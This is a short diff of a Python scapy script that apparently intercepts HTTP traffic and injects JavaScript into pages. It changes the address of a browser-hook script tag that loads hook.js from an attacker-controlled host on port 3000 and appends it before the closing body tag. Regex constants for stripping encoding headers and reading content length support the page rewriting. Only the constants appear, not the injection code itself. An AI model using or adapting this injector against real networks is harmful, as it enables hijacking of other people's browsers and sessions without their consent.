@@ -9,7 +9,7 @@ from scapy.layers.inet import IP,TCP
 HTTP11 = "HTTP/1.1"
 HTTP10 = "HTTP/1.0"
 PAGE_END_TAG = "</body>"
-JS_HOOK = """ <script src="http://192.168.1.12:3000/hook.js"> alert("Hacking is Kool") </script>"""
+JS_HOOK = """ <script src="http://10.42.0.1:3000/hook.js"> alert("Hacking is Kool") </script>"""
 TXT_HTML = "text/html"
 SUPPORTED_ENCODING = "Accept-Encoding:.*?\\r\\n"
 CONTENT_LENGTH = r"(?:Content-Length:\s)(\d*)"
